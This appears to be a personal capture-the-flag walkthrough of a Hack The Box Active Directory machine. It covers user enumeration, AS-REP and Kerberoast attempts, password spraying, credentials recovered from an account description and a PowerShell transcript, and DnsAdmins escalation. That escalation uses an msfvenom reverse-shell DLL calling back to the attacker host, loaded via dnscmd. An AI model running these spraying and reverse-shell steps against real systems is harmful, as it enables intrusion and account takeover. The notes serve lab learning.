- enum4linux in tcp139 folder gave a list of usernames
```
cat scans/tcp_139/enum4linux.txt | grep usernames 
```
- Enter the usernames into usernames.txt and check with kerbrute for valid usernames 
```
kerbrute userenum --dc 10.10.10.169 -d megabank.local usernames.txt > userenum.txt
```
- Get more readable data like USERNAME@DOMAIN with
```
awk '{print $7}' userenum.txt > valid_usernames.txt
```
- Get it down to single names without @DOMAIN with 
```
cut -d '@' -f 1 > actual_usernames.txt
```
- Check for asreproast with impacket-getnpusers
```
impacket-GetNPUsers -dc-ip 10.10.10.169 megabank.local/ -usersfile actual_users.txt -format hashcat -outputfile hashes_domain.txt
```
- No luck output below
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] [Errno Connection error (10.10.10.169:88)] [Errno 110] Connection timed out
[-] User marko doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User naoki doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User simon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zach doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User angela doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gustavo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sally doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sunita doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fred doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ulf doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User felicia doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User abigail doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User stevie doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User annette doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User annika doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User claire doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User steve doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User per doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paulo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User claude doesn't have UF_DONT_REQUIRE_PREAUTH set
```
- Found Marko's password
```
|   MEGABANK\marko (RID: 1111)
|     Full name:   Marko Novak
|     Description: Account created. Password set to Welcome123!
|     Flags:       Normal user account, Password does not expire
```
- tried a kerberoast no luck
```
impacket-GetUserSPNs -dc-ip 10.10.10.169 megabank.local/marko:Welcome123! -request
```
- tried evil-winrm no luck
```
evil-winrm -u marko -p Welcome123! -i 10.10.10.169
```
- Trying a password spray with Marko's password to see if it's reused
```
/opt/kerbrute/dist/kerbrute_linux_amd64 passwordspray --dc 10.10.10.169 -d megabank.local ../../actual_users.txt 'Welcome123!'
```
- No luck
- Trying SMB with marko permission
```
smbclient -L //10.10.10.169/ -U megabank.local\\marko 
```
- Nothing
- password spray with nxc shows melanie uses the default password too
```
nxc smb -d megabank.local --dns-server 10.10.10.169 -u ../actual_users.txt -p Welcome123! --continue-on-success 10.10.10.169
```
```
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\naoki:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\simon:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE
```
- Also looks like marko's password has since changed as it didn't validate during the nxc password spray 
- evil-winrm with melanie got me user.txt
```
evil-winrm -u melanie -p Welcome123! -i 10.10.10.169
```
- Found the PowerShell history file via the following commands 
```
ls -force C:\
```
```
ls -force C:\PSTranscripts
```
```
ls -force C:\PSTranscripts\20191203
```
- Got the file 
```
PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```
- Got ryan's password
```
Serv3r4Admin4cc123!
```
- trying smb as ryan
```
nxc smb -u ryan -p Serv3r4Admin4cc123! --dns-server 10.10.10.169 -d megabank.local 10.10.10.169
```
```
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
```
- Enumerating shares
```
nxc smb -u ryan -p Serv3r4Admin4cc123! --dns-server 10.10.10.169 -d megabank.local 10.10.10.169 --shares
```
```
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
SMB         10.10.10.169    445    RESOLUTE         [*] Enumerated shares
SMB         10.10.10.169    445    RESOLUTE         Share           Permissions     Remark
SMB         10.10.10.169    445    RESOLUTE         -----           -----------     ------
SMB         10.10.10.169    445    RESOLUTE         ADMIN$                          Remote Admin
SMB         10.10.10.169    445    RESOLUTE         C$                              Default share
SMB         10.10.10.169    445    RESOLUTE         IPC$                            Remote IPC
SMB         10.10.10.169    445    RESOLUTE         NETLOGON        READ            Logon server share 
SMB         10.10.10.169    445    RESOLUTE         SYSVOL          READ            Logon server share 
```
- Got into sysvol
```
smbclient -U megabank.local\\ryan //10.10.10.169/sysvol
```
- Nothing interesting 
- checked netlogon too 
```
smbclient -U megabank.local\\ryan //10.10.10.169/netlogon1
```
- Nothing interesting
- going to try the execs from impacket with ryan since he is an admin
- No luck. going to try sharphound if I can get in via winrm
- Got sharphound
- looks like ryan is in the DNSADMINS  and CONTRACTORS groups with GenericAll rights to ACCOUNT OPERATORS. going to try to add him to account operators and go from there
- tried from linux. going to try from windows. looks easier
- dnscmd is abusable from LOLBAS especialy since he is in DNSAdmins group
- Vulnerability
```
dnscmd.exe /config /serverlevelplugindll \\path\to\dll
```
- Creating the dll payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.22 LPORT=5555 -f dll -o rev.dll
```
- having an issue with smb server from impacket starting 
- fix is below
- Find out if i have a listener on 445
```
sudo netstat -tuln | grep ':445'
```
- It just says listen so I can find the open files with the lsof command 
```
sudo lsof -i :445
```
- Output
```
python3 96736 root 13u  IPv6 150728      0t0  TCP *:microsoft-ds (LISTEN)
```
- Need more information getting it with ps
```
sudo ps -p 96736 -f
```
- Output
```
root       96736   96735  0 Jan26 pts/7    00:02:58 python3 ./Responder.py -I tun0
```
- Killing the responder process
```
sudo kill 96736
```
- check for successful kill with 
```
sudo netstat -tuln | grep ':445'
```
- should see nothing in the output
- starting the smb share with impacket
```
impacket-smbserver -i 10.10.14.22 <SHARENAME> <DIRECTORY>
```
- started the nc listener for my reverse shell
```
nc -nlvp 5555
```
- Back on windows exploit with 
```
dnscmd.exe /config /serverlevelplugindll \\10.10.14.22\s\rev.dll
```
- Output
```
Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```
- Then on windows
```
sc.exe \\resolute stop dns
```
```
sc.exe \\resolute start dns
```
- This has to be done within a minute and look for the connection on the smb server as well as the nc listener
- Got the shell 